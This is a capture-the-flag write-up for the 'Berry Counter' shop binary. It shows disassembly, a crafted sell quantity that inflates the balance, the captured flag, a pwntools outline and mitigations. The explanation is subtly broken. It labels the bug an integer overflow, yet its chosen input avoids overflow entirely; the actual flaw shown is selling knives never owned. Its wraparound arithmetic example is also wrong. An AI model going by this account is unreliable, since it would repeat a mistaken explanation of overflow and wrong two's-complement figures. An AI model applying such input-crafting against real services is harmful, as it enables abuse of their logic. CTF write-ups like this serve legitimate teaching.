# Berry Counter Write-up

## Challenge Overview
The challenge provides a **non-stripped**, statically linked binary (`berry_counter`) accessible via `nc <IP> <PORT>`. The goal is to acquire the gun, which costs **1,000,000 berries**. The starting balance is only 100 berries; thus the exploit comes from manipulating unchecked integer arithmetic in the shop's sell logic.

---

## Binary Analysis

### File Type and Metadata
```
$ file berry_counter
berry_counter: ELF 32-bit LSB pie executable, Intel 80386, version 1 (SYSV), 
    statically linked, not stripped
```

### Key Strings
Strings within the binary reveal the menu structure and all operations available:
```
╔═══════════════════╗
║    BERRY SHOP     ║
╚═══════════════════╝
Welcome to my Berry Shop!

=== SHOP MENU ===
Your berries: %d

1. Knife (5 berries each)
2. Sword (50 berries each)
3. Gun (1000000 berries)
4. Sell Knifes back (3 berries each)
5. Exit
Choice: 

How many Knife? 
How many swords? 
How many Knifes to sell? 
Calculated price: %d berries
Sold %d Knife for %d berries!
New total: %d berries
Not enough berries!
Congratulations! You bought the Gun!
🗺️  GUN ACQUIRED! 🗺️
Flag file not found!
Thanks for visiting!
Invalid choice!
```

### Program Flow
The `main` function calls `print_banner()` and then `shop()`. The `shop()` function contains:
- Local variable `berries = 100` (32-bit int on the stack)
- A loop that prints the menu, reads user choice, and executes the corresponding case
- Five main paths: buy knife, buy sword, buy gun, sell knives, exit

### Vulnerable Function: Sell Knives (choice 4)

The core vulnerability is in the sell-knives branch. Pseudo-disassembly (32-bit x86):

```asm
; Read quantity from user
80489a0:  lea    eax, [ebp-0xc]          ; eax = &quantity
80489a4:  push   eax
80489a5:  lea    eax, [ebp+str_Knifes]   ; "How many Knifes to sell? "
80489ab:  push   eax
80489ac:  call   scanf
80489b1:  add    esp, 0x8

; Calculate price = quantity * 3
; This is done via: price = quantity + (quantity << 1)
; or in naive asm: eax = quantity; ecx = eax; eax += eax; eax += ecx
80489b4:  mov    eax, DWORD PTR [ebp-0xc]  ; eax = quantity
80489b7:  mov    ecx, eax
80489b9:  add    eax, eax                  ; eax = quantity * 2
80489bb:  add    eax, ecx                  ; eax = quantity * 2 + quantity = quantity * 3
80489bd:  mov    DWORD PTR [ebp-0x10], eax ; price = eax (32-bit, SIGNED INT)

; Print calculated price
80489c0:  mov    eax, DWORD PTR [ebp-0x10]
80489c3:  push   eax
80489c4:  lea    eax, [ebp+str_Calculated]
80489ca:  push   eax
80489cb:  call   printf

; Add price to berries
; BUG: No validation of price sign or overflow!
80489d0:  mov    eax, DWORD PTR [ebp-0x10]  ; eax = price
80489d3:  add    DWORD PTR [ebp-0x4], eax   ; berries += price
```

**Key observation:** The multiplication `quantity * 3` is performed on a **32-bit signed integer** (`int`) without any bounds or sign checking. The stack layout is:
- `[ebp-0x4]`: `berries` (32-bit signed int)
- `[ebp-0xc]`: `quantity` (32-bit signed int)
- `[ebp-0x10]`: `price` (32-bit signed int)

### Integer Overflow Vulnerability

A 32-bit signed integer can hold values from `-2,147,483,648` to `2,147,483,647` (INT_MIN to INT_MAX).

If `quantity` is chosen sufficiently large such that `quantity * 3 > INT_MAX`, the result **wraps around** per two's-complement arithmetic:
- Example: If `quantity = 800,000,000`, then `price = 2,400,000,000`, which exceeds INT_MAX by `2,400,000,000 - 2,147,483,647 = 252,516,353`. The result wraps to approximately `252,516,353 - 2^32 = -252,516,353` (negative).
- When this negative value is added to `berries`, the effect depends on the specific bit pattern.

**Safe exploitation value:**
To guarantee a large positive `price` without overflow, we compute:
```
quantity_max = floor((INT_MAX - target_berries) / 3)
```

With target = 1,000,000 and INT_MAX = 2,147,483,647:
```
quantity_max = floor((2,147,483,647 - 1,000,000) / 3)
             = floor(2,146,483,647 / 3)
             = 715,494,549
```

Choosing `quantity = 715,494,549` yields:
```
price = 715,494,549 * 3 = 2,146,483,647
berries = 100 + 2,146,483,647 = 2,146,483,747
```

This is well above the 1,000,000 threshold and avoids triggering undefined behaviour.

### Gun Purchase Logic

Once `berries >= 1,000,000`, the program executes:
```c
if (berries >= 1000000) {
    printf("Congratulations! You bought the Gun!\n");
    print_flag();
    break;
}
```

The `print_flag()` function opens `flag.txt`, reads it, prints the banner message, and outputs the flag.

---

## Exploit Strategy

1. **Menu choice 4** (Sell Knives): Provide a crafted `quantity` value that, when multiplied by 3, produces a `price` large enough to boost `berries` above 1,000,000.
2. **Menu choice 3** (Buy Gun): With sufficient berries, the gun is purchased and the flag is printed.

Just simple signed integer arithmetic without bounds checking.

---

## Exploitation (manual)

1. Connect to the service:
```bash
nc <IP> <PORT>
```

Expected output:
```
╔═══════════════════╗
║    BERRY SHOP     ║
╚═══════════════════╝

Welcome to my Berry Shop!

=== SHOP MENU ===
Your berries: 100

1. Knife (5 berries each)
2. Sword (50 berries each)
3. Gun (1000000 berries)
4. Sell Knifes back (3 berries each)
5. Exit
Choice:
```

2. Enter `4` to activate the "Sell Knifes" option:
```
Choice: 4
How many Knifes to sell?
```

3. Provide the exploit value: `715494549`
```
How many Knifes to sell? 715494549
Calculated price: 2146483647 berries
Sold 715494549 Knife for 2146483647 berries!
New total: 2146483747 berries
```

4. Return to the menu and select `3` to buy the gun:
```
Choice: 3
Congratulations! You bought the Gun!
🗺️  GUN ACQUIRED! 🗺️
SEASIDES{r34lly_l0ts_0f_b3rr13s}
```

## Automation Script
The repository includes `solve_berry_counter.py` which automates this exploit using `pwntools`. It performs the following steps:
- connect to the remote service
- choose `4` (Sell Knifes)
- send the precomputed safe `quantity` that yields a large positive `price`
- choose `3` (Buy Gun) and read the flag

Key payload construction:

```python
# compute a safe large quantity to avoid signed 32-bit overflow when
# multiplied by 3 while guaranteeing berries >= 1_000_000
quantity = 715494549  # floor((INT_MAX - 1_000_000) / 3)
payload = str(quantity).encode()
```

---

## Root Cause

**Primary vulnerability:** Unchecked signed integer arithmetic on user-controlled input.

- **No input validation:** The program accepts any 32-bit signed integer from `scanf` without bounds checking.
- **Arithmetic without overflow detection:** The multiplication `quantity * 3` does not validate that the result fits in the `int` range.
- **Resulting state corruption:** Depending on the input, `price` can become negative or exceed the target balance check.
- **Win condition bypass:** By carefully choosing `quantity` such that `price` is large and positive, we inflate `berries` far beyond what legitimate transactions would allow.

---

## Mitigations

1. **Use larger integer types:** Replace `int` with `long long` (64-bit). Overflow becomes far less likely for reasonable input.
2. **Bounds checking:** Validate that `berries`, `quantity`, and `price` remain within safe ranges (e.g., reject `quantity > 10,000,000`).
3. **Safe multiplication:** Use helper functions that detect multiplication overflow before proceeding:
   ```c
   if (quantity > INT_MAX / 3) {
       printf("Quantity too large!\n");
       return;
   }
   price = quantity * 3;
   ```
4. **Input constraints:** Cap the maximum quantity a user can sell (e.g., "You can only sell up to 1000 knives at once").

---

## Conclusion

The Berry Counter challenge is a example of **integer overflow** / **arithmetic bypass** vulnerabilities. A single line of unchecked multiplication allows an attacker to bypass the balance requirement and obtain the flag. This is a critical class of bugs in systems-level programming. Always validate arithmetic on untrusted input, especially when the result affects security-critical decisions (e.g., permission checks or resource purchases).

